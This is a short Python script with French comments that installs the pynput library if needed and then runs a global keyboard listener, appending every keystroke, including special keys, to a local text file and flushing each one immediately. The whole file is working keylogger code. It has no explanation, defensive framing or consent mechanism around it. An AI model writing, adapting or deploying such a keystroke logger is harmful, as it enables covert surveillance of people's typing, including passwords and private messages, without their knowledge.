import subprocess
import sys

# Vérifier et installer les packages nécessaires
def verifier_et_installer(package):
    try:
        __import__(package)
    except ImportError:
        print(f"Le package '{package}' n'est pas installé. Installation en cours...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Vérifiez les packages nécessaires
verifier_et_installer("pynput")

from pynput.keyboard import Listener, Key

with open("frappes_clavier.txt", "a") as fichier:
    def ecrire(touche):
        try:
            # Écrit les touches normales
            fichier.write(f"{touche.char}")
        except AttributeError:
            # Gère les touches spéciales
            if touche == Key.space:  # Si la touche est Key.space, ajouter un espace
                fichier.write(" ")
            else:
                fichier.write(f" {str(touche)} ")
        fichier.flush()  # Assure l'écriture immédiate dans le fichier

    listener = Listener(on_press=ecrire)
    listener.start()
    listener.join()
